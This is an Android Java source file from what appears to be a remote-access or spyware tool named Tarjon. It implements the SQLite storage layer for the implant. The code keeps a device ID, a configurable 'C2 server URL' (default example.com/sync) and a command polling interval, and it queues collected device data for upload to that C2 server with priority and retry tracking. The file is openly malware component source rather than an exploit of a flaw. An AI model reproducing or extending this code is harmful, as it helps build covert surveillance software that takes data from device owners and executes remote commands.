package com.tarjon.admin.db;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Persistent storage for collected data and settings.
 */
public class DataStorage extends SQLiteOpenHelper {

    private static final String TAG = "TarjonDataStorage";
    
    // Database info
    private static final String DATABASE_NAME = "tarjon_data.db";
    private static final int DATABASE_VERSION = 1;
    
    // Tables
    private static final String TABLE_CONFIG = "config";
    private static final String TABLE_PENDING_DATA = "pending_data";
    private static final String TABLE_DEVICE_INFO = "device_info";
    
    // Common columns
    private static final String KEY_ID = "id";
    private static final String KEY_TIMESTAMP = "timestamp";
    
    // Config table columns
    private static final String KEY_CONFIG_NAME = "name";
    private static final String KEY_CONFIG_VALUE = "value";
    
    // Pending data table columns
    private static final String KEY_DATA_TYPE = "data_type";
    private static final String KEY_DATA_CONTENT = "content";
    private static final String KEY_DATA_ENCRYPTED = "encrypted";
    private static final String KEY_DATA_PRIORITY = "priority";
    private static final String KEY_DATA_SENT = "sent";
    private static final String KEY_DATA_ATTEMPTS = "send_attempts";
    
    // Device info table columns
    private static final String KEY_INFO_NAME = "name";
    private static final String KEY_INFO_VALUE = "value";
    
    public DataStorage(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }
    
    @Override
    public void onCreate(SQLiteDatabase db) {
        // Create config table
        String CREATE_CONFIG_TABLE = "CREATE TABLE " + TABLE_CONFIG + "("
                + KEY_ID + " INTEGER PRIMARY KEY,"
                + KEY_CONFIG_NAME + " TEXT UNIQUE,"
                + KEY_CONFIG_VALUE + " TEXT,"
                + KEY_TIMESTAMP + " INTEGER"
                + ")";
        db.execSQL(CREATE_CONFIG_TABLE);
        
        // Create pending data table
        String CREATE_PENDING_DATA_TABLE = "CREATE TABLE " + TABLE_PENDING_DATA + "("
                + KEY_ID + " INTEGER PRIMARY KEY,"
                + KEY_DATA_TYPE + " TEXT,"
                + KEY_DATA_CONTENT + " TEXT,"
                + KEY_DATA_ENCRYPTED + " INTEGER DEFAULT 0,"
                + KEY_DATA_PRIORITY + " INTEGER DEFAULT 0,"
                + KEY_DATA_SENT + " INTEGER DEFAULT 0,"
                + KEY_DATA_ATTEMPTS + " INTEGER DEFAULT 0,"
                + KEY_TIMESTAMP + " INTEGER"
                + ")";
        db.execSQL(CREATE_PENDING_DATA_TABLE);
        
        // Create device info table
        String CREATE_DEVICE_INFO_TABLE = "CREATE TABLE " + TABLE_DEVICE_INFO + "("
                + KEY_ID + " INTEGER PRIMARY KEY,"
                + KEY_INFO_NAME + " TEXT UNIQUE,"
                + KEY_INFO_VALUE + " TEXT,"
                + KEY_TIMESTAMP + " INTEGER"
                + ")";
        db.execSQL(CREATE_DEVICE_INFO_TABLE);
        
        // Initialize with default settings
        initializeDefaults(db);
    }
    
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        // For future schema upgrades
        if (oldVersion < 2) {
            // Upgrade from version 1 to 2
        }
    }
    
    /**
     * Initialize default settings in the database
     */
    private void initializeDefaults(SQLiteDatabase db) {
        long now = System.currentTimeMillis();
        
        // Initialize device ID if not already set
        ContentValues values = new ContentValues();
        values.put(KEY_CONFIG_NAME, "device_id");
        values.put(KEY_CONFIG_VALUE, generateDeviceId());
        values.put(KEY_TIMESTAMP, now);
        db.insert(TABLE_CONFIG, null, values);
        
        // Set default C2 server URL
        values = new ContentValues();
        values.put(KEY_CONFIG_NAME, "c2_server_url");
        values.put(KEY_CONFIG_VALUE, "https://example.com/sync");  // Default value, should be updated
        values.put(KEY_TIMESTAMP, now);
        db.insert(TABLE_CONFIG, null, values);
        
        // Set command polling interval (seconds)
        values = new ContentValues();
        values.put(KEY_CONFIG_NAME, "command_poll_interval");
        values.put(KEY_CONFIG_VALUE, "60");  // Default: 60 seconds
        values.put(KEY_TIMESTAMP, now);
        db.insert(TABLE_CONFIG, null, values);
    }
    
    /**
     * Generate a unique device ID
     */
    private String generateDeviceId() {
        // Generate a unique ID based on installation time and device info
        return "tarjon_" + System.currentTimeMillis() + "_" + Math.abs(java.util.UUID.randomUUID().hashCode());
    }
    
    /**
     * Save or update a configuration value
     */
    public void saveConfig(String name, String value) {
        SQLiteDatabase db = this.getWritableDatabase();
        
        ContentValues values = new ContentValues();
        values.put(KEY_CONFIG_VALUE, value);
        values.put(KEY_TIMESTAMP, System.currentTimeMillis());
        
        // Try update first
        int rows = db.update(TABLE_CONFIG, values, KEY_CONFIG_NAME + "=?", new String[]{name});
        
        // If no rows updated, insert new
        if (rows == 0) {
            values.put(KEY_CONFIG_NAME, name);
            db.insert(TABLE_CONFIG, null, values);
        }
        
        db.close();
    }
    
    /**
     * Get a configuration value
     */
    public String getConfig(String name, String defaultValue) {
        SQLiteDatabase db = this.getReadableDatabase();
        
        Cursor cursor = db.query(
                TABLE_CONFIG,
                new String[]{KEY_CONFIG_VALUE},
                KEY_CONFIG_NAME + "=?",
                new String[]{name},
                null, null, null, "1"
        );
        
        String value = defaultValue;
        if (cursor != null && cursor.moveToFirst()) {
            value = cursor.getString(0);
            cursor.close();
        }
        
        db.close();
        return value;
    }
    
    /**
     * Get device ID (creating one if not exists)
     */
    public String getDeviceId() {
        String deviceId = getConfig("device_id", null);
        
        if (deviceId == null) {
            deviceId = generateDeviceId();
            saveConfig("device_id", deviceId);
        }
        
        return deviceId;
    }
    
    /**
     * Get C2 server URL
     */
    public String getC2ServerUrl() {
        return getConfig("c2_server_url", "https://example.com/sync");
    }
    
    /**
     * Set C2 server URL
     */
    public void setC2ServerUrl(String url) {
        saveConfig("c2_server_url", url);
    }
    
    /**
     * Get command polling interval in seconds
     */
    public int getCommandPollInterval() {
        String interval = getConfig("command_poll_interval", "60");
        try {
            return Integer.parseInt(interval);
        } catch (NumberFormatException e) {
            return 60; // Default to 60 seconds
        }
    }
    
    /**
     * Save device information
     */
    public void saveDeviceInfo(String name, String value) {
        SQLiteDatabase db = this.getWritableDatabase();
        
        ContentValues values = new ContentValues();
        values.put(KEY_INFO_VALUE, value);
        values.put(KEY_TIMESTAMP, System.currentTimeMillis());
        
        // Try update first
        int rows = db.update(TABLE_DEVICE_INFO, values, KEY_INFO_NAME + "=?", new String[]{name});
        
        // If no rows updated, insert new
        if (rows == 0) {
            values.put(KEY_INFO_NAME, name);
            db.insert(TABLE_DEVICE_INFO, null, values);
        }
        
        db.close();
    }
    
    /**
     * Get all device information
     */
    public Map<String, String> getAllDeviceInfo() {
        SQLiteDatabase db = this.getReadableDatabase();
        Map<String, String> deviceInfo = new HashMap<>();
        
        Cursor cursor = db.query(
                TABLE_DEVICE_INFO,
                new String[]{KEY_INFO_NAME, KEY_INFO_VALUE},
                null, null, null, null, null
        );
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                deviceInfo.put(cursor.getString(0), cursor.getString(1));
            } while (cursor.moveToNext());
            
            cursor.close();
        }
        
        db.close();
        return deviceInfo;
    }
    
    /**
     * Queue data to be sent to the C2 server
     */
    public long queueDataForUpload(String dataType, String content, boolean encrypted, int priority) {
        SQLiteDatabase db = this.getWritableDatabase();
        
        ContentValues values = new ContentValues();
        values.put(KEY_DATA_TYPE, dataType);
        values.put(KEY_DATA_CONTENT, content);
        values.put(KEY_DATA_ENCRYPTED, encrypted ? 1 : 0);
        values.put(KEY_DATA_PRIORITY, priority);
        values.put(KEY_DATA_SENT, 0);
        values.put(KEY_DATA_ATTEMPTS, 0);
        values.put(KEY_TIMESTAMP, System.currentTimeMillis());
        
        long id = db.insert(TABLE_PENDING_DATA, null, values);
        db.close();
        
        return id;
    }
    
    /**
     * Get pending data for upload
     */
    public List<Map<String, Object>> getPendingData(int limit) {
        SQLiteDatabase db = this.getReadableDatabase();
        List<Map<String, Object>> pendingData = new ArrayList<>();
        
        Cursor cursor = db.query(
                TABLE_PENDING_DATA,
                new String[]{KEY_ID, KEY_DATA_TYPE, KEY_DATA_CONTENT, KEY_DATA_ENCRYPTED, 
                        KEY_DATA_PRIORITY, KEY_DATA_ATTEMPTS, KEY_TIMESTAMP},
                KEY_DATA_SENT + "=?",
                new String[]{"0"},
                null,
                null,
                KEY_DATA_PRIORITY + " DESC, " + KEY_TIMESTAMP + " ASC",
                String.valueOf(limit)
        );
        
        if (cursor != null && cursor.moveToFirst()) {
            do {
                Map<String, Object> data = new HashMap<>();
                data.put("id", cursor.getLong(0));
                data.put("type", cursor.getString(1));
                data.put("content", cursor.getString(2));
                data.put("encrypted", cursor.getInt(3) == 1);
                data.put("priority", cursor.getInt(4));
                data.put("attempts", cursor.getInt(5));
                data.put("timestamp", cursor.getLong(6));
                
                pendingData.add(data);
            } while (cursor.moveToNext());
            
            cursor.close();
        }
        
        db.close();
        return pendingData;
    }
    
    /**
     * Mark data as sent
     */
    public void markDataAsSent(long id) {
        SQLiteDatabase db = this.getWritableDatabase();
        
        ContentValues values = new ContentValues();
        values.put(KEY_DATA_SENT, 1);
        
        db.update(TABLE_PENDING_DATA, values, KEY_ID + "=?", new String[]{String.valueOf(id)});
        db.close();
    }
    
    /**
     * Increment send attempt counter
     */
    public void incrementSendAttempt(long id) {
        SQLiteDatabase db = this.getWritableDatabase();
        
        // First, get current attempts
        Cursor cursor = db.query(
                TABLE_PENDING_DATA,
                new String[]{KEY_DATA_ATTEMPTS},
                KEY_ID + "=?",
                new String[]{String.valueOf(id)},
                null, null, null
        );
        
        if (cursor != null && cursor.moveToFirst()) {
            int attempts = cursor.getInt(0) + 1;
            cursor.close();
            
            ContentValues values = new ContentValues();
            values.put(KEY_DATA_ATTEMPTS, attempts);
            
            db.update(TABLE_PENDING_DATA, values, KEY_ID + "=?", new String[]{String.valueOf(id)});
        }
        
        db.close();
    }
    
    /**
     * Clear pending data
     */
    public int clearPendingData() {
        SQLiteDatabase db = this.getWritableDatabase();
        int deleted = db.delete(TABLE_PENDING_DATA, null, null);
        db.close();
        return deleted;
    }
    
    /**
     * Delete old sent data
     */
    public int clearOldSentData(long olderThanTimestamp) {
        SQLiteDatabase db = this.getWritableDatabase();
        int deleted = db.delete(
                TABLE_PENDING_DATA,
                KEY_DATA_SENT + "=? AND " + KEY_TIMESTAMP + "<?",
                new String[]{"1", String.valueOf(olderThanTimestamp)}
        );
        db.close();
        return deleted;
    }
}